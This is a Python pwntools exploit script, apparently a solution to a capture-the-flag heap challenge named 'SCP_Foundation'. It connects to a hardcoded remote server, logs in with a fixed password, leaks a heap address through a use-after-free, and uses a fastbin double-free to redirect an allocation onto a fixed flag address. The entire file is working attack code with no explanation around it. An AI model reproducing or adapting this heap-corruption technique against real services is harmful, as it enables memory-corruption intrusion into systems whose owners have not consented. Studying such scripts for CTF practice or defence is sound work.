#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./SCP_Foundation')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.106.94.13', 50005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./SCP_Foundation', checksec=False)


def add(add_name_length, add_name, add_desc_length, add_desc):
    p.sendlineafter("> Now please tell me what you want to do :", '2')
    p.sendlineafter("> SCP name's length : ", str(add_name_length))
    p.sendafter("> SCP name : ", add_name)
    p.sendlineafter("> SCP description's length : ", str(add_desc_length))
    p.sendafter("> SCP description : ", add_desc)


def delete(delete_idx):
    p.sendlineafter("> Now please tell me what you want to do :", '4')
    p.sendlineafter("> SCP project ID : ", str(delete_idx))


def show(show_idx):
    p.sendlineafter("> Now please tell me what you want to do :", '5')
    p.sendlineafter("> SCP project ID : ", str(show_idx))
    p.recvuntil("# SCP's description is ")

addr_flag_chunk = 0x6030B8
p.sendlineafter('> Username:', 'ss')
p.sendlineafter('> Password:', 'For_the_glory_of_Brunhild')


add(0x10, '\x01', 0x10, '\x01')  # 0
delete(0)
show(0)
addr_heap = u32(p.recvuntil('\x0a')[: -1].ljust(4, '\x00')) - 0x1260
add(0x10, '\x01', 0x10, '\x01')  # 1->0
add(0x20, '\x01', 0x50, '\x01')  # 2
add(0x20, '\x01', 0x50, '\x01')  # 3
add(0x20, '\x01', 0x30, '\x01')  # 4
delete(2)
delete(3)
delete(4)
delete(2)
add(0x20, '\x01', 0x50, p64(addr_flag_chunk))  # 5
add(0x20, '\x01', 0x50, p64(addr_flag_chunk))  # 6
add(0x20, '\x01', 0x50, p64(addr_flag_chunk))  # 7
add(0x20, '\x01', 0x50, '\x01')  # 8
show(8)
success('addr_heap = ' + hex(addr_heap))

# gdb.attach(p)
p.interactive()
